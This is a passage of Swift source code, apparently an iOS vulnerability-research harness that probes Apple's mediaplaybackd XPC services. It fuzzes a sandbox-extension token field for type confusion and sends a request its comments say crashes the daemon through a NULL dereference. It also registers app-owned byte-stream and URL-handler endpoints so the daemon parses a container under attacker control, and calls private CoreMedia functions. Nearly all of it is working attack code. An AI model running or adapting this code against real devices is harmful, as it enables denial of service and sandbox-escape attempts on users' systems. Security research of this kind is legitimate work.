                    emit("xpcc8:   reply = \(describe(r))")
                    xq_release(r)
                } else {
                    emit("xpcc8: \(short)[\(variant)] -> no reply")
                }
                xq_release(m)
                Thread.sleep(forTimeInterval: 0.4)
            }
            xq_cancel(c); xq_release(c)
        }
        emit("xpcc8: done")
    }

    // MARK: - type confusion on the registration token

    /// sandboxserver accepts ExtensionTokenData and passes CFDataGetBytePtr of
    /// it straight to sandbox_extension_consume. Nothing validated the class of
    /// the object, so try every XPC type in that slot: a non-CFData object may
    /// be reinterpreted and produce a read at an attacker-influenced offset
    /// instead of the plain NULL dereference.
    func tokenTypeProbe() {
        emit("xpctt: token type confusion")
        var cases: [(String, (XObj, UnsafePointer<CChar>) -> Void)] = []

        cases.append(("data-empty", { m, k in
            if let d = xq_data_create(nil, 0) { xq_dictionary_set_value(m, k, d); xq_release(d) }
        }))
        cases.append(("data-1byte", { m, k in
            var b: UInt8 = 0x41
            withUnsafeBytes(of: &b) { raw in
                if let d = xq_data_create(raw.baseAddress, 1) { xq_dictionary_set_value(m, k, d); xq_release(d) }
            }
        }))
        cases.append(("data-4k-noNUL", { m, k in
            var b = [UInt8](repeating: 0x41, count: 4096)
            b.withUnsafeBytes { raw in
                if let d = xq_data_create(raw.baseAddress, raw.count) { xq_dictionary_set_value(m, k, d); xq_release(d) }
            }
        }))
        cases.append(("string-short", { m, k in
            "AAAA".withCString { v in xq_dictionary_set_string(m, k, v) }
        }))
        cases.append(("string-long", { m, k in
            String(repeating: "A", count: 3000).withCString { v in xq_dictionary_set_string(m, k, v) }
        }))
        cases.append(("int64", { m, k in xq_dictionary_set_int64(m, k, 0x4141414141414141) }))
        cases.append(("array", { m, k in
            if let arr = xq_array_create(nil, 0) { xq_dictionary_set_value(m, k, arr); xq_release(arr) }
        }))
        cases.append(("dictionary", { m, k in
            if let dd = xq_dictionary_create(nil, nil, 0) { xq_dictionary_set_value(m, k, dd); xq_release(dd) }
        }))

        for (label, setter) in cases {
            guard let c = "com.apple.coremedia.mediaplaybackd.sandboxserver.xpc"
                .withCString({ xq_connection_create_service($0, queue, 0) }) else { continue }
            xq_set_event_handler(c) { _ in }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                ".IsDaemon".withCString { xq_dictionary_set_uint64(ping, $0, 0) }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            if tok == 0 {
                emit("xpctt: \(label): no token, skipping"); xq_release(c); continue
            }
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726538) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
                "ExtensionTokenData".withCString { setter(m, $0) }
                "ExtensionPath".withCString { k in
                    "/private/var/mobile/Media".withCString { v in xq_dictionary_set_string(m, k, v) }
                }
                let r = sendSync(c, m, timeout: 5.0)
                if let r {
                    let hasErr = ".ErrorReturn".withCString { xq_dictionary_get_value(r, $0) } != nil
                    let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit("xpctt: \(label) -> \(hasErr ? "err=\(err)" : "no ErrorReturn")")
                    xq_release(r)
                } else {
                    emit("xpctt: \(label) -> no reply")
                }
                xq_release(m)
            }
            xq_cancel(c); xq_release(c)
            Thread.sleep(forTimeInterval: 0.6)
        }
        emit("xpctt: done")
    }

    // MARK: - alternative services

    /// Other mediaplaybackd services that may accept a URL and do parsing or
    /// decoding in the daemon without the served-state gate that blocks FCBS.
    func altServicesProbe() {
        let services = [
            "com.apple.coremedia.mediaplaybackd.assetimagegenerator.xpc",
            "com.apple.coremedia.mediaplaybackd.samplegenerator.xpc",
            "com.apple.coremedia.mediaplaybackd.mutablemovie.xpc",
            "com.apple.coremedia.mediaplaybackd.remaker.xpc",
        ]
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4") else {
            emit("xpcalt: sample missing"); return
        }
        let url = mp4.absoluteString

        for svc in services {
            let short = svc.split(separator: ".").dropLast().last.map(String.init) ?? svc
            guard let conn = svc.withCString({ xq_connection_create_service($0, queue, 0) }) else {
                emit("xpcalt: \(short): connect failed"); continue
            }
            xq_set_event_handler(conn) { _ in }
            xq_resume(conn)

            var token: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                ".IsDaemon".withCString { xq_dictionary_set_uint64(ping, $0, 0) }
                if let r = sendSync(conn, ping, timeout: 5.0) {
                    token = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            if token == 0 { emit("xpcalt: \(short): no token"); xq_release(conn); continue }

            // "crea" with a URL under two plausible key names.
            for key in ["URL", "AssetURL"] {
                if let m = xq_dictionary_create(nil, nil, 0) {
                    ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                    ".Token".withCString { xq_dictionary_set_int64(m, $0, token) }
                    key.withCString { k in
                        url.withCString { v in xq_dictionary_set_string(m, k, v) }
                    }
                    let r = sendSync(conn, m, timeout: 6.0)
                    if let r {
                        let hasErr = ".ErrorReturn".withCString { xq_dictionary_get_value(r, $0) } != nil
                        let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                        emit("xpcalt: \(short) crea[\(key)] -> \(hasErr ? "err=\(err)" : "no ErrorReturn")")
                        if !hasErr { emit("xpcalt:   reply = \(describe(r))") }
                        xq_release(r)
                    } else {
                        emit("xpcalt: \(short) crea[\(key)] -> no reply")
                    }
                    xq_release(m)
                }
                Thread.sleep(forTimeInterval: 0.3)
            }
            xq_cancel(conn)
            xq_release(conn)
        }
        emit("xpcalt: done")
    }

    // MARK: - client-identity check through sandboxserver

    /// Three cre8 variants against sandboxserver, whose handler obtains the
    /// client identity from the audit token:
    ///
    ///   FigServer_GetClientPIDFromAuditToken(&token, ...);
    ///   FigXPCMessageCopyCFData(msg, "ExtensionTokenData", &data);
    ///   FigXPCMessageCopyCFString(msg, "ExtensionPath", &path);
    ///   FigSandboxRegistrationCreate(data, pid, path, &reg);
    ///
    /// Level of evidence: reaching the token/path checks shows that execution
    /// got past client identification on *this* service. It does not measure
    /// the PID that formatreader obtains via xpc_connection_get_pid, so the
    /// result is indirect by construction.
    func sandboxCre8Probe() {
        emit("??? 07 ?? mediaplaybackd crash")

        // Wait until the daemon answers a ping again: after a crash launchd
        // relaunches it, but not instantly.
        func waitForService(maxSeconds: Int) -> XObj? {
            var waited = 0
            while waited < maxSeconds {
                if let c = "com.apple.coremedia.mediaplaybackd.sandboxserver.xpc"
                    .withCString({ xq_connection_create_service($0, queue, 0) }) {
                    xq_set_event_handler(c) { _ in }
                    xq_resume(c)
                    var alive = false
                    if let ping = xq_dictionary_create(nil, nil, 0) {
                        ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                        ".ProcessName".withCString { k in
                            "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                        }
                        if let r = sendSync(c, ping, timeout: 3.0) {
                            let hasErr = ".ErrorReturn".withCString { xq_dictionary_get_value(r, $0) } != nil
                            alive = hasErr
                            xq_release(r)
                        }
                        xq_release(ping)
                    }
                    if alive {
                        emit("     service reachable after \(waited)s")
                        return c
                    }
                    xq_cancel(c)
                    xq_release(c)
                }
                Thread.sleep(forTimeInterval: 5.0)
                waited += 5
                emit("     waiting for the daemon to come back ?? \(waited)s")
            }
            return nil
        }

        guard let conn = waitForService(maxSeconds: 90) else {
            emit("[NO] the daemon did not come back within 90 s ?? nothing was sent")
            return
        }

        var token: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(conn, ping, timeout: 5.0) {
                token = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        emit("     handshake token \(token)")

        // Exactly one request: cre8 with no fields at all. This is the variant
        // that produced the NULL dereference in FigSandboxRegistrationCreate.
        guard let m = xq_dictionary_create(nil, nil, 0) else { xq_release(conn); return }
        ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726538) }
        if token != 0 { ".Token".withCString { xq_dictionary_set_int64(m, $0, token) } }
        let r = sendSync(conn, m, timeout: 6.0)
        if let r {
            let hasErr = ".ErrorReturn".withCString { xq_dictionary_get_value(r, $0) } != nil
            emit(hasErr ? "[NO] the daemon answered with ErrorReturn ?? it survived" : "[OK] no ErrorReturn ?? the daemon died on cre8")
            let desc = describe(r)
            let err = desc.range(of: "Connection interrupted") != nil ? "Connection interrupted"
                    : (desc.range(of: "Invalid") != nil ? "Invalid" : "an error reply")
            emit("     reply: XPCErrorDescription = \(err)")
            xq_release(r)
        } else {
            emit("[OK] no reply at all ?? the connection dropped, the daemon died")
        }
        xq_release(m)
        xq_cancel(conn)
        xq_release(conn)
        emit("     launchd restarts it in about 90 s")

        emit("??? done")
    }
    // MARK: - minimal single request

    /// One connection, one ping, one FCBS. Nothing else in this run.
    ///
    /// The hypothesis from section 32 is that the weak-reference-table add fails
    /// because the entry already exists, which would make a first and only
    /// request from a fresh connection behave differently.
    func minimalFCBS() {
        emit("xpcmin: single FCBS probe")
        guard let conn = "com.apple.coremedia.mediaplaybackd.formatreader.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xpcmin: connection failed"); return
        }
        xq_set_event_handler(conn) { _ in }
        xq_resume(conn)

        var token: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            ".IsDaemon".withCString { xq_dictionary_set_uint64(ping, $0, 0) }
            if let r = sendSync(conn, ping, timeout: 5.0) {
                token = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xpcmin: ping token=\(token)")
                xq_release(r)
            } else {
                emit("xpcmin: ping got no reply")
            }
            xq_release(ping)
        }

        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4") else {
            emit("xpcmin: sample missing"); xq_cancel(conn); xq_release(conn); return
        }
        let fd = open(mp4.path, O_RDONLY)
        guard fd >= 0, let fdo = xq_fd_create(fd) else {
            emit("xpcmin: fd failed"); xq_cancel(conn); xq_release(conn); return
        }
        let attrs = try? FileManager.default.attributesOfItem(atPath: mp4.path)
        let size = (attrs?[.size] as? NSNumber)?.int64Value ?? 0

        // Two encodings of the same descriptor: an xpc_fd object and a plain
        // integer. Whichever the server decodes will change the status code.
        let encodings: [(String, (XObj, UnsafePointer<CChar>) -> Void)] = [
            ("xpc_fd", { det, key in xq_dictionary_set_value(det, key, fdo) }),
            ("int64",  { det, key in xq_dictionary_set_int64(det, key, Int64(fd)) })
        ]
        for (label, setter) in encodings {
            if let det = xq_dictionary_create(nil, nil, 0),
               let m = xq_dictionary_create(nil, nil, 0) {
                "FileDescriptor".withCString { setter(det, $0) }
                "EntireLength".withCString { xq_dictionary_set_int64(det, $0, size) }
                "EntireLengthAvailable".withCString { xq_dictionary_set_int64(det, $0, 1) }
                "ReadsMayBlockIndefinitely".withCString { xq_dictionary_set_int64(det, $0, 1) }
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x46434253) }
                if token != 0 { ".Token".withCString { xq_dictionary_set_int64(m, $0, token) } }
                "ByteStreamDetails".withCString { xq_dictionary_set_value(m, $0, det) }
                let r = sendSync(conn, m, timeout: 8.0)
                emit("xpcmin: FCBS \(label) -> \(describe(r))")
                if let r { xq_release(r) }
                xq_release(m)
                xq_release(det)
            }
        }
        xq_release(fdo)
        xq_cancel(conn)
        xq_release(conn)
        emit("xpcmin: done")
    }

    // MARK: - byte stream server handed to the daemon

    /// Publishes a byte stream server of our own and asks formatreader to build
    /// a reader over it.
    ///
    /// _byteStreamServer_HandleCreateWithURLMessage showed that a stream can be
    /// described by kFigRemoteByteStreamDetail_ServerEndpoint instead of a URL.
    /// In that mode the daemon becomes the client: it connects to our endpoint
    /// and reads bytes from us, which means the container it parses is under our
    /// control.
    ///
    /// The request format is not known in advance, so every message is logged
    /// and answered with a zero status; the daemon's own first message tells us
    /// the real shape.
    func formatReaderWithEndpoint() {
        emit("xpcsrv: byte stream server + FCBS probe")

        guard let l = xq_connection_create(nil, queue) else { emit("xpcsrv: listener failed"); return }
        listener = l
        let connectionType = xq_get_type(l)

        // Capability bit 0 in the pong keeps the peer from requiring a live
        // process-state monitor over this endpoint.
        var monitorEp: XObj?
        if let ml = xq_connection_create(nil, queue) {
            xq_set_event_handler(ml) { _ in }
            xq_resume(ml)
            monitorEp = xq_endpoint_create(ml)
        }

        // The daemon answers .rp1 by connecting a "FigMemoryRecipient" client to
        // the endpoint we hand back, so the memory origin needs its own listener.
        var memEp: XObj?
        if let memL = xq_connection_create(nil, queue) {
            xq_set_event_handler(memL) { [weak self] event in
                guard let self, let event else { return }
                if xq_get_type(event) == connectionType {
                    self.emit("xpcmem: peer connected")
                    xq_set_event_handler(event) { [weak self] message in
                        guard let self, let message else { return }
                        let op = ".Operation".withCString { xq_dictionary_get_uint64(message, $0) }
                        self.emit("xpcmem: op=\(op) = \(self.describe(message))")
                        if let rep = xq_reply_create(message) {
                            ".Operation".withCString { xq_dictionary_set_uint64(rep, $0, op) }
                            ".ErrorReturn".withCString { xq_dictionary_set_uint64(rep, $0, 0) }
                            if let peer = xq_remote_connection(message) {
                                xq_send(peer, rep)
                            }
                            xq_release(rep)
                        }
                    }
                    xq_resume(event)
                }
            }
            xq_resume(memL)
            memEp = xq_endpoint_create(memL)
            emit("xpcmem: origin endpoint \(memEp != nil ? "ready" : "failed")")
        }

        xq_set_event_handler(l) { [weak self] event in
            guard let self, let event else { return }
            if xq_get_type(event) == connectionType {
                self.emit("xpcsrv: peer connected")
                xq_set_event_handler(event) { [weak self] message in
                    guard let self, let message else { return }
                    let op = ".Operation".withCString { xq_dictionary_get_uint64(message, $0) }
                    let opChars = String(bytes: [UInt8((op >> 24) & 0xff), UInt8((op >> 16) & 0xff),
                                                 UInt8((op >> 8) & 0xff), UInt8(op & 0xff)],
                                         encoding: .ascii) ?? "?"
                    self.emit("xpcsrv: request op=\(opChars) (\(op)) = \(self.describe(message))")

                    guard let rep = xq_reply_create(message) else {
                        self.emit("xpcsrv: no reply context")
                        return
                    }
                    switch op {
                    case 0x2e706e67:                       // ping
                        ".Operation".withCString { xq_dictionary_set_uint64(rep, $0, 0x2e706e67) }
                        ".ErrorReturn".withCString { xq_dictionary_set_uint64(rep, $0, 0) }
                        ".ServerCapabilities".withCString { xq_dictionary_set_uint64(rep, $0, 1) }
                        if let mon = monitorEp {
                            ".ProcessStateMonitorEndpoint".withCString { xq_dictionary_set_value(rep, $0, mon) }
                        }
                        self.emit("xpcsrv: pong")
                    case 0x2e727031:                       // .rp1 - memory recipient
                        // FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2
                        // reads exactly these two fields from message 1: the
                        // endpoint of our memory origin and a token used as the
                        // cache key for the recipient client.
                        // A reply carries no operation of its own; only the
                        // payload fields the recipient reads.
                        ".ErrorReturn".withCString { xq_dictionary_set_uint64(rep, $0, 0) }
                        if let mem = memEp {
                            "MemoryOriginEndpoint".withCString { xq_dictionary_set_value(rep, $0, mem) }
                        }
                        // Rather than imitating the wire format, call CoreMedia
                        // itself: FigMemoryOriginBeginEstablishingMemoryRecipient
                        // ByFillingInXPCMessage1 lazily starts a real FigXPC
                        // memory-origin server and fills the message with the
                        // exact endpoint and token the recipient expects.
                        var filled = false
                        if let sym = dlsym(UnsafeMutableRawPointer(bitPattern: -2),
                                           "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1") {
                            typealias FillFn = @convention(c) (XObj?) -> Int32
                            let fill = unsafeBitCast(sym, to: FillFn.self)
                            let rc = fill(rep)
                            self.emit("xpcsrv: memory origin fill rc=\(rc)")
                            filled = rc == 0
                            if rc == 0, let captured = "MemoryOriginEndpoint".withCString({ xq_dictionary_get_value(rep, $0) }) {
                                self.capturedMemoryEp = captured
                                self.emit("xpcsrv: captured a FigXPC server endpoint")
                                // Is the server that CoreMedia just started actually
                                // alive? Connect to it from this process and ping.
                                if let probe = xq_connection_from_endpoint(captured, self.queue) {
                                    xq_set_event_handler(probe) { _ in }
                                    xq_resume(probe)
                                    if let p = xq_dictionary_create(nil, nil, 0) {
                                        ".Operation".withCString { xq_dictionary_set_uint64(p, $0, 0x2e706e67) }
                                        ".ProcessName".withCString { k in
                                            "Bench27".withCString { v in xq_dictionary_set_string(p, k, v) }
                                        }
                                        let pr = self.sendSync(probe, p, timeout: 3.0)
                                        self.emit("xpcsrv: self-ping to memory server -> \(pr != nil ? "answered" : "no reply")")
                                        if let pr { self.emit("xpcsrv:   \(self.describe(pr))"); xq_release(pr) }
                                        xq_release(p)
                                    }
                                    xq_cancel(probe)
                                    xq_release(probe)
                                } else {
                                    self.emit("xpcsrv: cannot connect to the memory server endpoint")
                                }
                            }
                        } else {
                            self.emit("xpcsrv: memory origin symbol absent")
                        }
                        if !filled, let mem = memEp {
                            "MemoryOriginEndpoint".withCString { xq_dictionary_set_value(rep, $0, mem) }
                            "MemoryOriginServerToken".withCString { xq_dictionary_set_int64(rep, $0, 0x4D454D) }
                        }
                        self.emit("xpcsrv: offered memory origin endpoint")
                    case 0x646f6f6d:                       // doom
                        ".Operation".withCString { xq_dictionary_set_uint64(rep, $0, 0x646f6f6d) }
                        ".ErrorReturn".withCString { xq_dictionary_set_uint64(rep, $0, 0) }
                        self.emit("xpcsrv: teardown acked")
                    case 0x2e727032:                       // .rp2 - complete the recipient
                        // FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2
                        // looks OriginObjectID up in the memory origin server this
                        // process started and adopts the object it finds.
                        var rc: Int32 = -1
                        if let sym = dlsym(UnsafeMutableRawPointer(bitPattern: -2),
                                           "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2") {
                            typealias CompleteFn = @convention(c) (XObj?, UnsafeMutablePointer<XObj?>?) -> Int32
                            let complete = unsafeBitCast(sym, to: CompleteFn.self)
                            var out: XObj?
                            rc = complete(message, &out)
                            self.emit("xpcsrv: memory origin complete rc=\(rc) obj=\(out != nil)")
                            if let out { xq_release(out) }
                        } else {
                            self.emit("xpcsrv: completion symbol absent")
                        }
                        ".ErrorReturn".withCString { xq_dictionary_set_int64(rep, $0, Int64(rc)) }
                    default:
                        ".Operation".withCString { xq_dictionary_set_uint64(rep, $0, op) }
                        ".ErrorReturn".withCString { xq_dictionary_set_uint64(rep, $0, 0) }
                        self.emit("xpcsrv: acked op")
                    }
                    if let peer = xq_remote_connection(message) {
                        xq_send(peer, rep)
                    }
                    xq_release(rep)
                }
                xq_resume(event)
            } else {
                self.emit("xpcsrv: listener event = \(self.describe(event))")
            }
        }
        xq_resume(l)

        guard let ep = xq_endpoint_create(l) else { emit("xpcsrv: endpoint failed"); return }

        guard let conn = "com.apple.coremedia.mediaplaybackd.formatreader.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xpcsrv: service connection failed"); return
        }
        xq_set_event_handler(conn) { _ in }
        xq_resume(conn)

        var token: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            ".IsDaemon".withCString { xq_dictionary_set_uint64(ping, $0, 0) }
            if let reply = sendSync(conn, ping, timeout: 5.0) {
                token = ".Token".withCString { xq_dictionary_get_int64(reply, $0) }
                emit("xpcsrv: ping token=\(token)")
                xq_release(reply)
            }
            xq_release(ping)
        }

        // The ServerEndpoint branch of the details parser first reads ServerPID
        // and rejects the request when it is below 1 (0xffffcdb8 = -12872),
        // before it ever touches the endpoint. ServerPIDVersion is read too.
        let myPID = Int64(getpid())
        guard let details = xq_dictionary_create(nil, nil, 0) else { return }
        "ServerEndpoint".withCString { xq_dictionary_set_value(details, $0, ep) }
        "ServerPID".withCString { xq_dictionary_set_int64(details, $0, myPID) }
        "ServerPIDVersion".withCString { xq_dictionary_set_int64(details, $0, 1) }
        emit("xpcsrv: details ServerPID=\(myPID)")

        guard let msg = xq_dictionary_create(nil, nil, 0) else { xq_release(details); return }
        ".Operation".withCString { xq_dictionary_set_uint64(msg, $0, 0x46434253) }  // "FCBS"
        if token != 0 {
            ".Token".withCString { xq_dictionary_set_int64(msg, $0, token) }
        }
        "ByteStreamDetails".withCString { xq_dictionary_set_value(msg, $0, details) }
        let rep = sendSync(conn, msg, timeout: 10.0)
        emit("xpcsrv: FCBS -> \(describe(rep))")
        if let rep { xq_release(rep) }
        xq_release(msg)
        xq_release(details)

        // Second round: hand the daemon the endpoint of the real FigXPC server
        // that the memory origin started, instead of our plain listener.
        Thread.sleep(forTimeInterval: 4.0)
        if let cap = capturedMemoryEp {
            emit("xpcsrv: second FCBS with the FigXPC server endpoint")
            guard let d2 = xq_dictionary_create(nil, nil, 0) else { return }
            "ServerEndpoint".withCString { xq_dictionary_set_value(d2, $0, cap) }
            "ServerPID".withCString { xq_dictionary_set_int64(d2, $0, myPID) }
            "ServerPIDVersion".withCString { xq_dictionary_set_int64(d2, $0, 1) }
            guard let m2 = xq_dictionary_create(nil, nil, 0) else { xq_release(d2); return }
            ".Operation".withCString { xq_dictionary_set_uint64(m2, $0, 0x46434253) }
            if token != 0 { ".Token".withCString { xq_dictionary_set_int64(m2, $0, token) } }
            "ByteStreamDetails".withCString { xq_dictionary_set_value(m2, $0, d2) }
            let r2 = sendSync(conn, m2, timeout: 10.0)
            emit("xpcsrv: second FCBS -> \(describe(r2))")
            if let r2 { xq_release(r2) }
            xq_release(m2)
            xq_release(d2)
        } else {
            emit("xpcsrv: no FigXPC endpoint captured, skipping second round")
        }

        DispatchQueue.global().asyncAfter(deadline: .now() + .seconds(25)) { [weak self] in
            guard let self else { return }
            if let l = self.listener { xq_cancel(l); xq_release(l); self.listener = nil }
            xq_cancel(conn)
            xq_release(conn)
            xq_release(ep)
            self.emit("xpcsrv: window closed")
        }
    }

    // MARK: - act as the custom URL handler server

    /// Publishes our endpoint to the daemon and then prints whatever the daemon
    /// sends. If the daemon accepts the endpoint it becomes the client: it will
    /// ask us for data, which is the moment we learn the real request format.
    func serve(seconds: Int = 20) {
        emit("xpc: serving as custom URL handler for \(seconds)s")

        guard let l = xq_connection_create(nil, queue) else { emit("xpc: listener failed"); return }
        listener = l
        let connectionType = xq_get_type(l)

        // Declared before the handler is installed: the pong closure captures it.
        // A dedicated listener stands in for the process-state monitor endpoint
        // that CoreMedia's own handler publishes in its pong
        // (FigProcessStateMonitorServerEnsureStartedAndCopyEndpoint).
        var monitorEp: XObj?
        if let ml = xq_connection_create(nil, queue) {
            xq_set_event_handler(ml) { _ in }
            xq_resume(ml)
            monitorEp = xq_endpoint_create(ml)
            emit("xpc: monitor endpoint \(monitorEp != nil ? "ready" : "failed")")
        }
        // On a listener the event is a NEW peer connection, not a message.
        xq_set_event_handler(l) { [weak self] event in
            guard let self else { return }
            guard let event else { return }
            let type = xq_get_type(event)
            if type == connectionType {
                self.emit("xpc: peer connected")
                xq_set_event_handler(event) { [weak self] message in
                    guard let self else { return }
                    self.emit("xpc: request = \(self.describe(message))")
                    // The daemon opens with a ping: .Operation == 0x2e706e67
                    // ("png." in memory) plus .ProcessName/.IsDaemon/.Date.
                    // CoreMedia's own handler (_figXPC_HandleMessage) answers a
                    // ping with a pong carrying the SAME opcode, an
                    // .ErrorReturn and its server capabilities, and sends it
                    // asynchronously - not as a reply to a sync request.
                    // The ping arrives with a reply context; answering it as a
                    // fresh message makes the daemon drop the connection
                    // ("Connection invalid"). The reply must be derived from the
                    // original message and sent to that message's connection.
                    if let rep = xq_reply_create(message) {
                        ".Operation".withCString { xq_dictionary_set_uint64(rep, $0, 0x2e706e67) }
                        ".ErrorReturn".withCString { xq_dictionary_set_uint64(rep, $0, 0) }
                        // Bit 0 set: skip the peer state-monitor handshake. With the bit clear,
                        // _figXPCConnection_processServerReply requires a live process-state
                        // monitor over our endpoint, which we do not implement, and the
                        // daemon then aborts the setup on an RPC timeout.
                        ".ServerCapabilities".withCString { xq_dictionary_set_uint64(rep, $0, 1) }
                        ".Token".withCString { xq_dictionary_set_int64(rep, $0, 1) }
                        if let mon = monitorEp {
                            ".ProcessStateMonitorEndpoint".withCString { xq_dictionary_set_value(rep, $0, mon) }
                        }
                        if let peer = xq_remote_connection(message) {
                            xq_send(peer, rep)
                            self.emit("xpc: pong sent as reply")
                        } else {
                            self.emit("xpc: pong has no remote connection")
                        }
                        xq_release(rep)
                    } else {
                        self.emit("xpc: message carries no reply context")
                    }
                }
                xq_resume(event)
            } else {
                self.emit("xpc: listener event = \(self.describe(event))")
            }
        }
        xq_resume(l)


        guard let ep = xq_endpoint_create(l) else { emit("xpc: endpoint failed"); return }

        guard let conn = "com.apple.coremedia.mediaplaybackd.customurlloader.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xpc: service connection failed"); return
        }
        xq_set_event_handler(conn) { _ in }
        xq_resume(conn)

        // A FigXPC client opens with a ping and only then sends operations.
        // Sending an operation as the very first message is answered with
        // -16156 (0xffffc0e4), the "opcode not expected" code produced in
        // _figXPC_HandleMessage, so the ping is sent first here.
        //
        // _figXPCCreateXPCConnectionInternalSync shows the rest of the
        // handshake: after the sync ping it stores FigXPCMessageGetUInt64(reply,
        // ".Token") and every later message carries that token.
        //
        // The ping is retried on a fresh connection: after an earlier RPC
        // timeout the server can refuse a connection for a while, and one
        // failed attempt then says nothing about the protocol being wrong.
        var sessionToken: UInt64 = 0
        var pingOK = false
        for attempt in 1...3 {
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                ".IsDaemon".withCString { xq_dictionary_set_uint64(ping, $0, 0) }
                ".AbortActionID".withCString { xq_dictionary_set_uint64(ping, $0, 1) }
                let pingReply = sendSync(conn, ping, timeout: 5.0)
                if let pingReply {
                    // .Token is an int64 in the reply; reading it as uint64 returns 0.
                    let rawToken = ".Token".withCString { xq_dictionary_get_int64(pingReply, $0) }
                    sessionToken = rawToken > 0 ? UInt64(rawToken) : 0
                    pingOK = sessionToken != 0
                    emit("xpc: ping reply token=\(sessionToken) (attempt \(attempt))")
                    emit("xpc: ping reply = \(describe(pingReply))")
                    xq_release(pingReply)
                } else {
                    emit("xpc: ping got no reply (attempt \(attempt))")
                }
                xq_release(ping)
            }
            if pingOK { break }
            Thread.sleep(forTimeInterval: 2.0)
        }
        if !pingOK {
            emit("xpc: ping never succeeded, skipping the endpoint handshake")
            DispatchQueue.main.asyncAfter(deadline: .now() + .seconds(seconds)) { [weak self] in
                guard let self else { return }
                if let l = self.listener { xq_cancel(l); xq_release(l); self.listener = nil }
                xq_cancel(conn)
                xq_release(conn)
                xq_release(ep)
                self.emit("xpc: serve window closed")
            }
            return
        }

        guard let msg = xq_dictionary_create(nil, nil, 0) else { return }
        ".Operation".withCString { xq_dictionary_set_uint64(msg, $0, 0x2e736574) }
        if sessionToken != 0 {
            ".Token".withCString { xq_dictionary_set_int64(msg, $0, Int64(sessionToken)) }
        }
        "CustomURLLoader_Endpoint".withCString { xq_dictionary_set_value(msg, $0, ep) }
        let rep = sendSync(conn, msg)
        emit("xpc: handshake -> \(describe(rep))")
        if let rep { xq_release(rep) }
        xq_release(msg)

        // The handshake reply is -16152, produced by
        // FigXPConnectionLookupAndRetainAssociatedObject: the client was built
        // (the daemon connected to us), but the operation then looks up an
        // object we never created. Sweep the operations this handler dispatches
        // together with objectID variants to find one that does not need it.
        let ops: [(UInt64, String, Int64)] = [
            (0x636c5452, "clTR", 0), (0x636c4349, "clCI", 0),
            (0x2e736574, ".set", 0), (0x2e736574, ".set", 1),
            (0x636c5452, "clTR", 1), (0x636c4349, "clCI", 1)
        ]
        for (op, opName, objID) in ops {
            guard let probe = xq_dictionary_create(nil, nil, 0) else { continue }
            ".Operation".withCString { xq_dictionary_set_uint64(probe, $0, op) }
            ".objectID".withCString { xq_dictionary_set_int64(probe, $0, objID) }
            if sessionToken != 0 {
                ".Token".withCString { xq_dictionary_set_int64(probe, $0, Int64(sessionToken)) }
            }
            "CustomURLLoader_Endpoint".withCString { xq_dictionary_set_value(probe, $0, ep) }
            let opReply = sendSync(conn, probe, timeout: 4.0)
            let code = opReply.map { r -> Int64 in
                ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
            }
            emit("xpc: op=\(opName) objectID=\(objID) -> \(code.map(String.init) ?? "no reply")")
            if let opReply { xq_release(opReply) }
            xq_release(probe)
            Thread.sleep(forTimeInterval: 0.3)
        }

        // Keep the listener alive so the daemon can reach us.
        DispatchQueue.main.asyncAfter(deadline: .now() + .seconds(seconds)) { [weak self] in
            guard let self else { return }
